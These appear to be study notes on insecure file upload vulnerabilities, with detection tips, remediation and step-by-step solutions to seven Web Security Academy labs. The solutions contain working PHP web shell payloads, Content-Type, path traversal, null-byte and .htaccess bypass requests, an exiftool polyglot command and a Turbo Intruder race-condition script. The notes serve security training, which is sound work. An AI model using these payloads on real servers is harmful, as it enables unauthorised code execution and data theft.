## 1. Vulnerability Core

- **Vulnerability Type:** Unrestricted / Insecure File Upload
    
- **Core Meaning:** File upload vulnerabilities occur when an application accepts user-supplied files without checking or validating characteristics such as file extension, MIME type, signature, size, or internal structural integrity. This lack of validation allows an attacker to inject dangerous files (e.g., server-side scripts) directly into the server's filesystem layout.
    
- **The Downstream Pivot:** If the target application saves these scripts to directories configured to process code, an attacker can invoke them via regular HTTP requests. This establishes a **Web Shell**, granting arbitrary Remote Code Execution (RCE) on the server, allowing the attacker to read source files, siphon backend databases, or pivot deeper into hidden internal networks.
    

## 2. Detection & Attack Surface Mapping (In the Wild)

Finding file upload entry points requires analyzing multi-part requests that process user attachments, media vectors, or system configuration logs.

### Identifying High-Risk Code Features

- **Profile Management Dashboards:** Modules handling user avatar modifications or document uploads (`/my-account/avatar`, `/profile/upload`).
    
- **Content Management Platforms:** Rich text asset editors that allow users to link images or upload attachments to articles.
    
- **Document Processing Gateways:** Bulk file handling tools that convert text files, verify receipts, or ingest business invoices.
    

### Active Probing Strategy

- **Intercept Multipart Payloads:** Inspect the structural boundary headers generated during file transfers. Track fields like `filename="image.png"` and `Content-Type: image/jpeg`.
    
- **Trace Static Storage Endpoints:** After upload, verify where the asset is saved by inspecting image layout elements or script references (e.g., looking for paths like `/files/avatars/` or `/static/uploads/`).
    
- **Test Directory Execution Rules:** Determine if the upload directory actively executes server-side code or handles script extensions as static, text-only downloads.
    

## 3. Classifications (The Scenarios)

- **Unrestricted Code Deployment:** The application allows direct, unvalidated transmission of standard backend scripts (like `.php`, `.jsp`, `.asp`), executing them immediately upon requests to the public uploads folder.
    
- **Client-Controllable MIME Manipulation:** Bypassing content type verification checks by changing the browser-declared `Content-Type` parameter to an expected string (e.g., changing `application/x-php` to `image/png`).
    
- **Directory Traversal Overrides:** Using path traversal sequences (`../`) inside the `filename` parameter to drop code files out of a strictly locked static files directory and into an executable parent folder.
    
- **Configuration Mapping Hijacking:** Uploading direct web configuration overrides (like `.htaccess` or `web.config`) to force the server engine to parse arbitrary file extensions (e.g., treating `.l33t` as a executable script file).
    
- **Extension Obfuscation & Null Byte Stripping:** Truncating file validations using null characters (`%00`) or combining multi-extension strings (`.php.jpg`) to confuse the parsing validation rules.
    
- **Non-Recursive Filter Stripping:** Injecting interleaved extensions (such as `.p.phphp`) to reconstruct a banned script suffix after a single-pass sanitization loop strips the initial match.
    

## 4. Remediation

- **Implement Strict Extension Whitelisting:** Validate the file extension against a predefined list of safe formats (e.g., `.jpg`, `.png`). Do not rely on blacklists.
    
- **Isolate Storage Directories:** Store uploaded assets on an isolated storage partition, on an external object store (like AWS S3), or in a directory explicitly configured to prevent code execution (`php_flag engine off` or removing execution permissions globally via filesystem rules).
    
- **Randomize Stored Filenames:** Automatically rename uploaded files to unpredictable hashes (e.g., a UUID v4) upon ingestion to prevent direct script execution attempts and path traversal injection.
    

## 5. Lab Breakthroughs & Payloads

### Lab 1: Remote code execution via web shell upload

- **Attack Vector:** Missing backend validation checks allow direct script updates to enter the destination path unmodified.
    

 ### 🛑 **SOLUTION & PAYLOAD BREAKDOWN**
 
 **Exploitation Routine (Payload):**
 
 1. [ ] Create a local file named `exploit.php` designed to extract the secret flag file:
     
     PHP
     
     ```
     <?php echo file_get_contents('/home/carlos/secret'); ?>
     ```
     
 2. [ ] Submit the script through the avatar upload portal.
     
 3. [ ] Issue an HTTP `GET` request directly to the static files folder to run the exploit and capture the returned secret:
     
     HTTP
     
     ```
     GET /files/avatars/exploit.php HTTP/1.1
     Host: YOUR-LAB-ID.web-security-academy.net
     ```
     

### Lab 2: Web shell upload via Content-Type restriction bypass

- **Attack Vector:** The server validates files by verifying the user-supplied `Content-Type` transmission header without performing deeper inspection on the file's internal magic bytes.
    

 ### 🛑 **SOLUTION & PAYLOAD BREAKDOWN**
 
 **Exploitation Routine (Payload):**
 
 1. [ ] Intercept your `exploit.php` upload request inside Burp Suite.
     
 2. [ ] Locate the individual multipart block tracking your file payload parameters and modify the client-controlled header line to match an allowed image type:
     
     HTTP
     
     ```
     Content-Disposition: form-data; name="avatar"; filename="exploit.php"
     Content-Type: image/jpeg
         <?php echo file_get_contents('/home/carlos/secret'); ?>
     ```

 3. [ ] Send the request, then pull down the executed output at `/files/avatars/exploit.php`.


### Lab 3: Web shell upload via path traversal

- **Attack Vector:** The storage folder prevents script execution, but the filename parameter is vulnerable to a directory traversal injection that allows you to drop files into executable parent folders.
    

 ### 🛑 **SOLUTION & PAYLOAD BREAKDOWN**
 
 **Exploitation Routine (Payload):**
 
 1. [ ] Intercept the standard file payload block.
     
 2. [ ] Modify the `filename` string to include a path traversal instruction. Double-URL encode the path separator slash character (`/` becomes `%2523` or `%2f` based on parser decoding rules) to bypass the basic sanitization controls:
     
     HTTP
     
     ```
     Content-Disposition: form-data; name="avatar"; filename="..%2fexploit.php"
     Content-Type: application/x-php
     ```
     
 3. [ ] The server decodes the string and moves the file up out of the restricted assets directory. Execute the web shell by requesting the application's root file storage endpoint:
 
     HTTP
     
     ```
     GET /files/exploit.php HTTP/1.1
     ```
     

### Lab 4: Web shell upload via extension blacklist bypass

- **Attack Vector:** The back-end drops standard `.php` extensions using a deny list filter but lets users upload custom server orchestration assets like Apache configuration files (`.htaccess`).
    

 ### 🛑 **SOLUTION & PAYLOAD BREAKDOWN**

 **Exploitation Routine (Payload):**
 
 1. [ ] Intercept the attachment upload request. Swap the `filename` value to `.htaccess` and change the target `Content-Type` indicator to `text/plain`.
     
 2. [ ] Replace the file body with a custom configuration directive that maps a brand new extension string to the executable PHP script handler engine:
     
     HTTP
     
     ```
     Content-Disposition: form-data; name="avatar"; filename=".htaccess"
     Content-Type: text/plain
     
     AddType application/x-httpd-php .l33t
     ```
     
 3. [ ] Submit the configuration file. Next, rename your script file to `exploit.l33t` and upload it.
     
 4. [ ] Trigger the exploit payload by accessing your custom script at its uploaded endpoint:
     
     HTTP
     
     ```
     GET /files/avatars/exploit.l33t HTTP/1.1
     ```
     

### Lab 5: Web shell upload via obfuscated file extension

- **Attack Vector:** Higher-level application code validates extensions using string matching rules, but the lower-level system architecture truncates input strings when it encounters special control markers like null bytes.
    

 ### 🛑 **SOLUTION & PAYLOAD BREAKDOWN**
 
 **Exploitation Routine (Payload):**
 
 1. [ ] Package your file request with a multi-extension string separated by a URL-encoded null byte character block (`%00`).
     
 2. [ ] The front-end filter looks at the trailing characters and accepts the file as a valid image format (`.jpg`). When saving the file to disk, the backend system truncates the filename at the null byte, writing the file to the server as a working script:
     
     HTTP
     
     ```
     Content-Disposition: form-data; name="avatar"; filename="exploit.php%00.jpg"
     Content-Type: image/jpeg
     
     <?php echo file_get_contents('/home/carlos/secret'); ?>
     ```
     
 3. [ ] Read the output from the truncated file location path: `GET /files/avatars/exploit.php`.

### - **Advanced File Upload Bypass (Content Discrepancy & Race Conditions)**
    
- **Core Meaning:** Even when a server attempts to look past simple `Content-Type` headers by verifying intrinsic characteristics (e.g., image dimensions, magic bytes, or using third-party verification engines), the file handling process itself may introduce structural bypasses. This manifests in two primary ways:
    
    1. **Polyglot Parsing:** Crafting an asset that validates cleanly as an image (correct structural headers/footers) but embeds functional code within variable comment or metadata sections (e.g., EXIF fields).
        
    2. **Time-of-Check to Time-of-Use (TOCTOU) Race Conditions:** When a server temporarily saves an incoming file into an accessible web directory _before_ validating it and running a clean-up thread (like an antivirus routine or file-type check), a small execution window opens.
        
- **The Downstream Pivot:** These vectors break structural, defense-in-depth sanitization models. By exploiting the exact gap between file ingestion and execution, or combining disjointed language modules, an attacker forces an application to serve executable content out of structurally sound components.
    

## 2. Detection & Attack Surface Mapping (In the Wild)

Finding deep file validation anomalies involves assessing the timing behavior of asset creation pipelines and observing how complex file parsing libraries interact.

### Identifying High-Risk Code Features

- **Asynchronous Data Processing:** Systems that immediately acknowledge an asset upload but delay output display or verification metrics (often indicating an external queue or asynchronous job worker).
    
- **Decoupled Verification Functions:** Code blocks utilizing raw operating system commands or custom subroutines (e.g., `move_uploaded_file()` directly followed by a separate `unlink()` catch block) rather than isolated memory-buffer validations.
    

### Active Probing Strategy

- **Parallel Request Bursting:** Measure latency discrepancies by sending an execution request simultaneously with an unvalidated file upload submission to determine if the asset exists temporarily on disk.
    
- **Metadata Manipulation (EXIF):** Ingest raw text or code blocks into image header blocks using target management utilities to see if binary compilation engines process or strip the data fields.
    

## 3. Classifications (The Scenarios)

- **Polyglot Execution:** Forcing a language runtime (like PHP) to read past a file's binary image header (`FF D8 FF`) and discover executable code blocks hidden inside text metadata markers.
    
- **Temporary Storage File Extraction:** Intercepting a file in transit when an application blindly dumps data directly into a public scratch directory before scrubbing or deleting the asset.
    
- **Asynchronous Chunk-Load Prolongation:** Artificially inflating file sizes with large streams of blank byte padding to expand the window of an active race condition during transmission.
    
- **Client-Side Polyglot Pivoting:** Dropping executable HTML or SVG components disguised as normal images to execute stored Cross-Site Scripting (XSS) actions inside a visitor's browser space.
    

## 4. Remediation

- **Validate in Non-Accessible Memory:** Never move an incoming stream into a public-facing directory until all internal scanning functions have returned clean state values. Use sandboxed memory pools or non-executable temporary storage buffers (`/tmp`).
    
- **Strip Image Metadata:** Implement automated post-processing routines using specialized graphics development kits (e.g., ImageMagick or GD library) to actively re-encode all uploaded images, stripping out text metadata properties like comment strings or EXIF properties.


### Lab 6: Remote code execution via polyglot web shell upload

- **Attack Vector:** The application checks the integrity of image assets to verify they contain a valid layout footprint. However, the parser fails to wipe metadata attributes, allowing a PHP interpreter to locate and run payload scripts embedded directly inside image comments.
    

Bash

```
# Injection Command (Local Machine)
exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" input.jpg -o polyglot.php
```

 ### 🛑 **SOLUTION & PAYLOAD BREAKDOWN**
 
 **Exploitation Routine (Payload):**
 
 1. [ ] Use `ExifTool` locally to inject a functional PHP execution macro directly into a standard JPEG image's `Comment` structural attribute field, exporting the final asset with a `.php` extension.
     
 2. [ ] Submit `polyglot.php` via the standard avatar form portal. The server validates the binary file headers (`FF D8 FF`), reads the physical dimensions, and stores the asset.
     
 3. [ ] Issue an HTTP `GET` request to retrieve the newly created file:
     
     HTTP
     
     ```
     GET /files/avatars/polyglot.php HTTP/1.1
     Host: target.web-security-academy.net
     ```
     
 4. [ ] Inspect the raw binary response stream. The script processor skips the image blocks but evaluates the dynamic metadata block, printing out the secret payload surrounded by the target boundaries: `START 2B2tlPyJQfJDynyKME5D02Cw0ouydMpZ END`.
     

### Lab 7: Web shell upload via race condition

- **Attack Vector:** The application uses custom file handling code that writes incoming items to an accessible folder (`avatars/`) _before_ validating the extension type. If validation checks fail, the application unlinks the file, creating a temporary time-window where the file exists and can be executed.
    

#### Turbo Intruder Exploit Template (`race.py`)

Python

```
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=10)

    # Raw POST payload block for file creation
    request1 = '''POST /my-account/avatar HTTP/1.1
Host: target.web-security-academy.net
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryX
Content-Length: 460

------WebKitFormBoundaryX
Content-Disposition: form-data; name="avatar"; filename="exploit.php"
Content-Type: application/x-php

<?php echo file_get_contents('/home/carlos/secret'); ?>
------WebKitFormBoundaryX--'''

    # Raw GET request block targeting execution
    request2 = '''GET /files/avatars/exploit.php HTTP/1.1
Host: target.web-security-academy.net'''

    # Queue requests to synchronize timing alignment via a single gate release
    engine.queue(request1, gate='race1')
    for x in range(5):
        engine.queue(request2, gate='race1')

    # Release the gate to send the trailing byte of all requests simultaneously
    engine.openGate('race1')
    engine.complete(timeout=60)

def handleResponse(req, interesting):
    table.add(req)
```

 ### 🛑 **SOLUTION & PAYLOAD BREAKDOWN**
 
 **Exploitation Routine (Payload):**
 
 1. [ ] Capture the multi-part file upload `POST` transaction block and a corresponding `GET` file request inside Burp Suite, then forward the traffic to Turbo Intruder.
     
 2. [ ] Implement the single-gate architecture script shown above. This ensures that the upload request and multiple concurrent retrieval attempts land on the server at the exact same moment.
     
 3. [ ] Run the attack mechanism. This synchronises the parallel network frames, forcing the server to evaluate several execution requests (`GET /files/avatars/exploit.php`) during the tiny time gap after `move_uploaded_file()` runs but before `unlink()` deletes the asset.
     
 4. [ ] Analyse the Turbo Intruder output history grid to locate the successful `200 OK` connection containing the clear text string value of Carlos's secret token.
